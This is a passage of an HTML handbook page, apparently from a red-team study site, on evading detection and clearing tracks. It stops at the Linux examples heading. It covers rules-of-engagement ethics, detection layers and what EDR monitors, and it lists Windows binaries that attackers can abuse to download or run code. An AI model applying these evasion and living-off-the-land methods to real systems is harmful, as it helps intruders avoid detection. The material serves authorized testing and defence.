@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><title>Untitled</title><meta charset="utf-8"/><link rel="preload" href="../index-b488e415.css" as="style"/><link rel="preload" href="../prescript-2bfc6315.js" as="script"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space Grotesk:wght@400;700&amp;family=Inter:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Cybersecurity Handbook"/><meta property="og:title" content="Untitled"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Untitled"/><meta name="twitter:description" content="Detection, Evasion, and Clearing Tracks Privilege Escalation Handbook — File 08 OPSEC, evasion concepts, log hygiene, and forensic awareness Authorized engagements only."/><meta property="og:description" content="Detection, Evasion, and Clearing Tracks Privilege Escalation Handbook — File 08 OPSEC, evasion concepts, log hygiene, and forensic awareness Authorized engagements only."/><meta property="og:image:alt" content="Detection, Evasion, and Clearing Tracks Privilege Escalation Handbook — File 08 OPSEC, evasion concepts, log hygiene, and forensic awareness Authorized engagements only."/><meta property="og:image" content="https://cybersecurity-handbook.vercel.app/static/og-image.png"/><meta property="og:image:url" content="https://cybersecurity-handbook.vercel.app/static/og-image.png"/><meta name="twitter:image" content="https://cybersecurity-handbook.vercel.app/static/og-image.png"/><meta property="og:image:type" content="image/.png"/><meta property="twitter:domain" content="cybersecurity-handbook.vercel.app"/><meta property="og:url" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/08_detection_evasion_and_clearing_tracks"/><meta property="twitter:url" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/08_detection_evasion_and_clearing_tracks"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Detection, Evasion, and Clearing Tracks Privilege Escalation Handbook — File 08 OPSEC, evasion concepts, log hygiene, and forensic awareness Authorized engagements only."/><meta name="generator" content="Quartz"/><link href="../index-b488e415.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-735924e0.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-589c1cea.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-2911f5d1.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-e427079e.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-53b25b2b.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-c93c6a44.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-8a06014f.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-77d6a441.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-6ee21cee.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-1ea6ad18.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-34bdfded.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-788c9ca3.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-642859cd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-4abc06bd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-274a3dfe.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-94cb6c84.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-58d5ff56.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-9f9b2774.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-caf7c009.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-7262b5a7.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-a5c806d2.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-6bd36952.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-9857b007.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-d3a1a224.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" data-persist="true"/><script src="../prescript-2bfc6315.js" type="application/javascript" data-persist="true"></script><script type="application/javascript" data-persist="true">const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted%20Grotesk%3Awght%40400%3B700&amp;family=Source%20Sans%20Pro%3Aital%2Cwght%400%2C400%3B0%2C600%3B1%2C400%3B1%2C600&amp;family=IBM%20Plex%20Mono%3Awght%40400%3B600&amp;display=swap"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/08_detection_evasion_and_clearing_tracks-og-image.webp"/><meta property="og:image:url" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/08_detection_evasion_and_clearing_tracks-og-image.webp"/><meta name="twitter:image" content="https://cybersecurity-handbook.vercel.app/privilege-escalation-handbook/08_detection_evasion_and_clearing_tracks-og-image.webp"/><meta property="og:image:type" content="image/webp"/></head><body data-slug="privilege-escalation-handbook/08_detection_evasion_and_clearing_tracks" data-basepath><div id="quartz-root" class="page" data-frame="default"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href="..">Cybersecurity Handbook</a></h2><div class="mobile-only"><div class="spacer"></div></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 0.5rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button" aria-label="Search" aria-expanded="false"><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg><p>Search</p></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something..." placeholder="Search for something..."/><div class="search-layout" data-preview="true" data-field-priority="[&quot;title&quot;,&quot;content&quot;,&quot;tags&quot;]"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode" aria-label="Dark mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode" aria-label="Reader mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer nav-files-container" data-behavior="collapse" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a2, b2) => {\r\n    if (!a2.isFolder &amp;&amp; !b2.isFolder || a2.isFolder &amp;&amp; b2.isFolder) {\r\n      return (a2.displayName || \&quot;\&quot;).localeCompare(b2.displayName || \&quot;\&quot;, void 0, {\r\n        numeric: true,\r\n        sensitivity: \&quot;base\&quot;\r\n      });\r\n    }\r\n    if (!a2.isFolder &amp;&amp; b2.isFolder) {\r\n      return 1;\r\n    }\r\n    return -1;\r\n  }&quot;,&quot;filterFn&quot;:&quot;(node) => node.slugSegment !== \&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;(node) => {\r\n    return node;\r\n  }&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-302" aria-label="Explorer"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-302" class="explorer-content" aria-expanded="false" role="group"><ul class="explorer-ul overflow" id="list-0"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#" class="nav-file-title tree-item-self"></a></li></template><template id="template-folder"><li><div class="folder-container nav-folder-title tree-item-self"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon nav-folder-collapse-indicator collapse-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content tree-item-children"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><p show-comma="true" class="content-meta"><time datetime="2026-08-05T18:59:14.000Z">Aug 06, 2026</time><span>12 min read</span></p></div></div><article class="popover-hint"><div class="markdown-preview-view markdown-rendered"><h1 id="detection-evasion-and-clearing-tracks">Detection, Evasion, and Clearing Tracks<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#detection-evasion-and-clearing-tracks" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<blockquote>
+<p><strong>Privilege Escalation Handbook</strong> — File 08<br/>
+OPSEC, evasion concepts, log hygiene, and forensic awareness<br/>
+<strong>Authorized engagements only.</strong> Many techniques are dual-use; defenders should use this file to strengthen detection. Always follow Rules of Engagement (ROE) — some clients forbid log deletion or evasion testing.</p>
+</blockquote>
+<hr/>
+<h2 id="table-of-contents">Table of Contents<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#table-of-contents" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ol>
+<li><a href="#1-engagement-ethics--roe" class="internal internal-link alias">Engagement Ethics &amp; ROE</a></li>
+<li><a href="#2-detection-landscape-overview" class="internal internal-link alias">Detection Landscape Overview</a></li>
+<li><a href="#3-living-off-the-land-lolbins" class="internal internal-link alias">Living Off the Land (LOLBins)</a></li>
+<li><a href="#4-process-injection-concepts" class="internal internal-link alias">Process Injection Concepts</a></li>
+<li><a href="#5-obfuscation-techniques" class="internal internal-link alias">Obfuscation Techniques</a></li>
+<li><a href="#6-anti-debugging--anti-vm-awareness" class="internal internal-link alias">Anti-Debugging &amp; Anti-VM (Awareness)</a></li>
+<li><a href="#7-linux-log--artifact-clearing" class="internal internal-link alias">Linux Log &amp; Artifact Clearing</a></li>
+<li><a href="#8-windows-log--artifact-clearing" class="internal internal-link alias">Windows Log &amp; Artifact Clearing</a></li>
+<li><a href="#9-shell-history--file-cleanup" class="internal internal-link alias">Shell History &amp; File Cleanup</a></li>
+<li><a href="#10-network-evasion" class="internal internal-link alias">Network Evasion</a></li>
+<li><a href="#11-stealth-persistence-patterns" class="internal internal-link alias">Stealth Persistence Patterns</a></li>
+<li><a href="#12-forensic-awareness--anti-forensics" class="internal internal-link alias">Forensic Awareness &amp; Anti-Forensics</a></li>
+<li><a href="#13-blue-team-detection-opportunities" class="internal internal-link alias">Blue Team Detection Opportunities</a></li>
+<li><a href="#14-references" class="internal internal-link alias">References</a></li>
+</ol>
+<hr/>
+<h2 id="1-engagement-ethics--roe">1. Engagement Ethics &amp; ROE<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-engagement-ethics--roe" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="11-before-you-hide-anything">1.1 Before You Hide Anything<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#11-before-you-hide-anything" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Confirm whether the client allows:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Activity</th><th>Often allowed?</th><th>Notes</th></tr></thead><tbody><tr><td>AV/EDR bypass testing</td><td>Sometimes</td><td>Scoped hosts only</td></tr><tr><td>Log deletion</td><td>Rarely</td><td>Breaks blue team value</td></tr><tr><td>Disabling security tools</td><td>Rarely</td><td>Outage risk</td></tr><tr><td>Persistence</td><td>Sometimes</td><td>Must clean up</td></tr><tr><td>Memory-only payloads</td><td>Common in RT</td><td>Still document</td></tr></tbody></table></div>
+<blockquote>
+<p><strong>Warning:</strong> Deleting production logs without approval can violate contract, law, and destroy incident-response capability. Prefer <strong>minimal footprint</strong> over <strong>destructive cover-up</strong> unless ROE explicitly tests detection/response.</p>
+</blockquote>
+<h3 id="12-professional-defaults">1.2 Professional Defaults<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#12-professional-defaults" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ol>
+<li>Minimize noise rather than wipe evidence.</li>
+<li>Record every change for cleanup.</li>
+<li>If testing evasion, do it on designated hosts with monitoring restored after.</li>
+<li>Never teach or use these methods on systems you do not own or have written authorization to test.</li>
+</ol>
+<hr/>
+<h2 id="2-detection-landscape-overview">2. Detection Landscape Overview<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-detection-landscape-overview" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="21-layers">2.1 Layers<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#21-layers" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Layer</th><th>Examples</th><th>Catches</th></tr></thead><tbody><tr><td><strong>AV</strong></td><td>Windows Defender, ClamAV</td><td>Known malware on disk</td></tr><tr><td><strong>EDR</strong></td><td>Crowdstrike, Defender ATP, SentinelOne</td><td>Behavior, memory, lineage</td></tr><tr><td><strong>NDR / Net logs</strong></td><td>Zeek, firewall, proxy</td><td>C2, exfil, beaconing</td></tr><tr><td><strong>SIEM</strong></td><td>Splunk, Elastic, Sentinel</td><td>Correlated events</td></tr><tr><td><strong>Sysmon / auditd</strong></td><td>Host telemetry</td><td>Granular process/file/registry</td></tr><tr><td><strong>Identity</strong></td><td>Entra, Okta, AD logs</td><td>Auth anomalies</td></tr></tbody></table></div>
+<h3 id="22-what-modern-edr-cares-about">2.2 What Modern EDR Cares About<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#22-what-modern-edr-cares-about" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Process <strong>ancestry</strong> (Office → cmd → powershell → unknown)</li>
+<li><strong>Rare</strong> parent/child pairs</li>
+<li>LSASS access</li>
+<li>Privilege escalation API sequences</li>
+<li>Encoded PowerShell</li>
+<li>Unsigned drivers / vulnerable driver loads</li>
+<li>Persistence creation</li>
+<li>Network to rare destinations</li>
+</ul>
+<h3 id="23-red-team-implication">2.3 Red Team Implication<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#23-red-team-implication" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>“Undetected” is temporary and environment-specific. Design for <strong>dwell time needed for objectives</strong>, not mythical invisibility.</p>
+<hr/>
+<h2 id="3-living-off-the-land-lolbins">3. Living Off the Land (LOLBins)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-living-off-the-land-lolbins" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="31-concept">3.1 Concept<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#31-concept" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Use <strong>signed, trusted OS binaries</strong> to download, execute, compile, or persist — blending with admin activity.</p>
+<p>Catalogs:</p>
+<ul>
+<li><a href="https://lolbas-project.github.io/" class="external external-link">LOLBAS<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> (Windows)</li>
+<li><a href="https://gtfobins.github.io/" class="external external-link">GTFOBins<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> (Unix — dual purpose)</li>
+<li><a href="https://gtfobins.github.io/" class="external external-link">GTFOArgs<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a> / LOLdrivers</li>
+</ul>
+<h3 id="32-windows-examples-defensive--offensive-awareness">3.2 Windows Examples (Defensive + Offensive Awareness)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#32-windows-examples-defensive--offensive-awareness" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Binary</th><th>Abusable capability</th></tr></thead><tbody><tr><td><code>certutil</code></td><td>Download / decode</td></tr><tr><td><code>bitsadmin</code> / BITS PowerShell</td><td>Transfer</td></tr><tr><td><code>mshta</code></td><td>Execute HTA/JavaScript</td></tr><tr><td><code>regsvr32</code></td><td>COM scriptlets (historical squiblydoo)</td></tr><tr><td><code>rundll32</code></td><td>Run exports</td></tr><tr><td><code>wmic</code></td><td>Process call create (legacy)</td></tr><tr><td><code>powershell</code></td><td>Everything</td></tr><tr><td><code>cmd</code> + <code>for</code> loops</td><td>Scripting without files</td></tr><tr><td><code>installutil</code> / <code>msbuild</code></td><td>Execute code via trusted compilers</td></tr><tr><td><code>curl.exe</code> (modern Win)</td><td>Download</td></tr></tbody></table></div>
+<h3 id="33-linux-examples">3.3 Linux Examples<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#33-linux-examples" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
